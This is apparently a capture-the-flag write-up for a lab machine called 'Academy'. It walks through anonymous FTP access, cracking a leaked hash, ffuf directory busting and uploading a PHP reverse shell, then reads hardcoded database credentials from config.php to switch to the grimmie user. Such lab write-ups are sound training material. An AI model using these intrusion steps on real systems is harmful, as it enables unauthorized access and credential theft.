# Academy machine writeup

Starting with nmap scan we have three ports open 21 22 80 for ftp ssh http
## SCREENSHOT
let's enumerate ftp. Let's see if it provides anonymous login
## SCREENSHOT
Great it does provide anonymous login. We have an interesting file "note.txt". Check that file
## SCREENSHOT
It has inssert query, ok we have good findings like user_id and password hash. Crack the hash using online website like LINK.  
Yes we cracked the hash and it is "student", but how we can use that credential. Let's do some directory busting using ffuf. Why ffuf, because ffuf doesn't search inside any directory.
```
ffuf -u http://192.168.0.105/FUZZ  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ
[Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 2ms]
    * FUZZ: academy

[Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 2ms]
    * FUZZ: phpmyadmin

```
We found two paths /academy and /phpmyadmin. Let's try the credential we found in phpmyadmin, but it didn't work and it seems to be not vulnerable to sql injection, let's go to /academy. 
## SCREENSHOT
Great we are in, ok we are looking for a way to get a shell, there is file upload we can check it if it is vulnerable to RFI.
## SCREENSHOT
As we saw it is a php app we can use php reverse shell. Before we upload the shell we need to set netcat to listen to any incoming connections.  
Upload the file
## SCREENSHOT
Boom we have access, go to home
```
$ cd /home
$ ls
grimmie
```
we have grimmie user
```
cd grimmie
$ ls -la
total 36
drwxr-xr-x 3 grimmie administrator 4096 Jan 25 15:26 .
drwxr-xr-x 3 root    root          4096 May 30  2021 ..
-rw------- 1 grimmie administrator    1 Jun 16  2021 .bash_history
-rw-r--r-- 1 grimmie administrator  220 May 29  2021 .bash_logout
-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 .bashrc
drwxr-xr-x 3 grimmie administrator 4096 May 30  2021 .local
-rw-r--r-- 1 grimmie administrator  807 May 29  2021 .profile
-rwxr-xr-- 1 grimmie administrator   57 Jan 25 15:26 backup.sh
```
we have interesting file "backup.sh" but we can't execute it since we are www-data, we need to be grimmie, leave it now and continue exploring the server. Let's explore the website code files looking for any hardcoded credentials.
```
$ cd /var/www/html/academy
admin                   enroll-history.php  my-profile.php
assets                  enroll.php          pincode-verification.php
change-password.php     includes            print.php
check_availability.php  index.php           studentphoto
db                      logout.php
```
Inside admin/includes, there is a hardcoded credentials for mysql database
```
$ cd admin
$ cat config.php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
?>
```
Great we have username "grimmie" and password "My_V3ryS3cur3_P4ss", let's try to switch to grimmie
```
$ su grimmie
su grimmie
Password: My_V3ryS3cur3_P4ss

grimmie@academy:/var/www/html/academy/admin/includes$ whoami
grimmie
grimmie@academy:/var/www/html/academy/admin/includes$
```
